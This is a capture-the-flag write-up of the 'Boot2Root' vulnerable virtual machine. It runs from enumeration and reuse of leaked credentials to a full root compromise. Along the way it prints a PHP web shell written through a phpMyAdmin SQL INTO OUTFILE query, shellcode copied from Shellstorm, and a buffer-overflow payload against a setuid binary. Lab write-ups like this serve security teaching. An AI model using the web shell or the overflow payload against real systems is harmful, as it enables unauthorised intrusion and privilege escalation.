<div align="center">
  <img src="images/42.png" alt="Boot2Root"/>
</div>

# Boot2Root

**Date:** 6th January 2026  
**Prepared By:** sben-tay's group

---

## Synopsis

Boot2Root is a vulnerable virtual machine configured with Host-only networking in VirtualBox. The challenge requires identifying the target machine without direct access and exploiting various services to gain root privileges. Multiple attack vectors are available through web services, network protocols, and Linux capabilities.

---

## Enumeration

### Nmap

Network discovery to identify the target machine on the Host-only network:

![alt text](images/nmap_found-ip.png)




Target identified: **192.168.56.101**

Port scan to enumerate services:

- **21/tcp  open  ftp**
- **22/tcp  open  ssh**
- **80/tcp  open  http**
- **143/tcp open  imap**
- **443/tcp open  https**
- **993/tcp open  imaps**


### Disearch
> src : https://github.com/maurosoria/dirsearch?tab=readme-ov-file#simple-usage
![alt text](images/disearch.png)

We can see three path :

- **/forum**  ->  https://192.168.56.101/forum/
- **/phpmyadmin**  ->  https://192.168.56.101/phpmyadmin/
- **/webmail**  ->  https://192.168.56.101/webmail/

---
## Exploitation

### Forum
> https://192.168.56.101/forum

We go to the forum and see several topics, one of which catches our attention !

![alt text](images/forum.png)

This is topic **Probleme login** of lmezard.

![alt text](images/topic.png)


We can see that this person is having trouble logging in and is sharing the entire contents of these logs with us.
In one of these attempts, this person tried to log in with a strange string of characters that looks like a password.

With his login and password, we can see that this gives us access to his forum account!

--
- **Login**    : `lmezard`
- **Password** : `!q\]Ej?*5K5cy*AJ`


Now we have access to lmzeard's mail we can try to connect at webmail !

![alt text](images/mail_forum.png)


### Webmail
>https://192.168.56.101/webmail/src/login.php
![alt text](images/connect_mail.png)

Let's try to connect with that:

- **login**    : `laurie@borntosec.net`
- **password** : `!q\]Ej?*5K5cy*AJ`

We get access to mailbox !

![alt text](images/dashboard_mail.png)

There are two emails in the inbox, one that is not interesting and one that is, and no, it's not the email with the **Very interesting!!!!** subject line that interests us, but the subject **DB Access**!

![alt text](images/mail_db.png)

We can see that the email states that lorry cannot connect to his database with these credentials, even though devide gave him the root logins while waiting! Let's try it now.


### Phpmyadmin
> https://192.168.56.101/phpmyadmin/
![alt text](images/phpmyadmin.png)

- **login**    : `root`
- **password** : `Fg-'kKXBj87E:aJ$`

We get access to database !

![alt text](images/phpmyadmin_dashboard.png)

Now that we have access to the database, we will inject a webshell to execute commands.

```sql
SELECT '<html><body><form method="GET"><input type="text" name="cmd"><input type="submit" value="Execute"></form><pre><?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?></pre></body></html>' 
INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```
We now have access to a new forum page, which is our webshell!

---
## Privilege Escalation

### WebShell
> https://192.168.56.101/forum/templates_c/shell.php
![alt text](images/webshell.png)

Now we can navigate around our shell. On the screen, we can see that in `/home` we have a folder called `LOOKATME`. Let's see what's inside.

![alt text](images/lookatme.png)
![alt text](images/cat_lookatme.png)

We have a username and password belonging to **lmezard**, but it doesn't work in ssh, so let's try it on the last service, `FTP`.

- **login**    : `lmezard`
- **password** : `G!@M6f4Eatau{sF"`

### FTP
![alt text](images/ftp_login.png)

We get access to ftp client !

![alt text](images/ftp_ls.png)

We have two files, `README` and `fun`, which we are going to retrieve.

![alt text](images/ftp_get.png)

Now let's open the readme file and see what's inside!

![alt text](images/ftp_README.png)
![alt text](images/ftp_fun.png)

> fun is a **tar** archive, so we unzip the file. We need to add the extension

![alt text](images/tar.png)

We now have an ft_fun file that contains several `.pcap` files, but Wireshark is unable to open them. This must be another trap.

![alt text](images/pcap.png)

A `.pcap` file is intriguing in terms of its difference in size.
![alt text](images/pcap_trap.png)

`-rw-r----- 1 sben-tay 2023_paris 32096 Aug 13  2015 BJPCP.pcap`

![alt text](images/gotyou!.png)

Looking at the file, we see a `main` that prints the SSH password! We need to search for the `getme[x]` functions in the `pcap` files!

![alt text](images/getme().png)


We observe the comment file5. By combining the information obtained previously, and with a little logic, we look for the continuation of this function, which is probably in file 6, or file6.


The first letter of the password is therefore I. We repeat this operation for the eleven other characters we are looking for and obtain: `Iheartpwnage` , which we will pass to sha256sum.

This gives us: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

Try to connect in ssh :

- **login**    : `laurie`
- **password** : `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

``ssh laurie@192.168.56.101``

### SSH -Laurie
![alt text](images/ssh_laurie.png)

We have a README file that asks us to distribute the bomb to obtain the user's password.

To simplify this puzzle, we will use `SCP` to copy the bomb binary so we can disassemble it on **GHIDRA**.

![alt text](images/Difuse_Bomb.png)

![alt text](images/ghydra.png)

A series of six puzzles is presented to us, and we must solve them to find Thor's password!

![alt text](images/bomb_difused.png)

As the README tells us, if we take all the correct answers and remove the spaces, we get Thor's password:

- **login**    : `thor`
- **password** : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`


### SSH - Thor

![alt text](images/thor_login.png)

**README** : _Finish this challenge and use the result as password for 'zaz' user._

**GAME** : _turtle_

![alt text](images/turtle_game.png)

The turtle file wrote a word if we reconstructed the steps described in the file, and that word was `SLASH`.
![alt text](images/SLASH.png)

At the end of the turtle file, the **digest** index means that we need to perform an MD5 (message digest) on `SLASH`.

![alt text](images/md5sum.png)


We can connect to zaz!

- **login**    : `zaz`
- **password** : `646da671ca01bb5d84dbb5fb2238dc8e`


### SSH - Zaz

![alt text](images/zaz_login.png)

We've reached the final exploit! We have a binary with a set_uid of `ROOT`! Looking at the program's security, we see that there is no canary, so we can potentially overflow the program and execute a shell with root privileges!

![](images/cannary_file.png)

#### step_1 : StackOverflow- nop slide

We need shellcode that we will put in the environment and use in the EIP overflow.

![alt text](images/shell_code.png)

We retrieved a shell code from the Shellstorm website that is compatible with our system.

``\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80``

![alt text](images/export_shellcode.png)

We need to retrieve the address of our shellcode in the environment from the program using gdb.

adresse: `0xbffffb63`

##### calcul offset

![alt text](images/OFSSET_gdb.png)

With our pattern, we can see that the eip overflows at `jjjj` [0x6a6a6a6a].

offset = `140`

##### Payload

Now all we have to do is execute our payload!
``./exploit_me $(python -c 'print "A"*140 + "\xbf\xff\xfb\x63"[::-1]')``

![alt text](images/payload.png)

**_Congratulation you'are root !_**


# END